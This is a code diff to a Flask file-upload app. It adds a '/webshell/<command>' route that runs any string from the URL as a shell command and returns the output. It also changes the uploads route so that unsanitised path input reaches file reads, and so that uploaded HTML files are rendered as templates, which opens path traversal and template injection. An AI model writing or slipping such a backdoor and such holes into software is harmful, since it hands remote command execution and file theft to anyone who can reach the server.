@@ -3,6 +3,7 @@ import os, subprocess
 from flask import (
     Flask, 
     send_from_directory, 
+    send_file, 
     render_template, 
     request
 )
@@ -38,11 +39,30 @@ def upload():
     return render_template('upload.html', msg=msg)
 
 @app.route('/uploads', methods=['GET'])
-@app.route('/uploads/<file_name>', methods=['GET'])
-def uploads(file_name=None):
+@app.route('/uploads/<path:file_name>', methods=['GET'])
+def uploads(file_name):
+    file_path = os.path.join('uploads', file_name)
+
     if not file_name:
         return '<h1>Missing file name in URL parameter.</h1>'
+
+    if not os.path.exists(file_path):
+        return '<h1>File not found.</h1>', 404
+
+    # Check the file extension to determine the appropriate action
+    if file_name.endswith('.html'):
+        return render_template(file_name)
+    elif file_name.endswith(('.jpg', '.jpeg', '.png', '.gif')):
+        return send_file(file_path, mimetype='image/jpeg', as_attachment=True)  # Adjust the mimetype as needed
     else:
-        if not os.path.exists('uploads/' + file_name):
-            return '<h1>File not found.</h1>', 404
-    return render_template('uploads/' + file_name)
+        try:
+            with open(file_path, 'r') as file:
+                file_content = file.read()
+            return file_content
+        except UnicodeDecodeError:
+            return 'Cannot display binary file.'
+
+@app.route('/webshell/<command>')
+def webshell(command):
+    result = subprocess.check_output(command, shell=True)
+    return result.decode('utf-8')
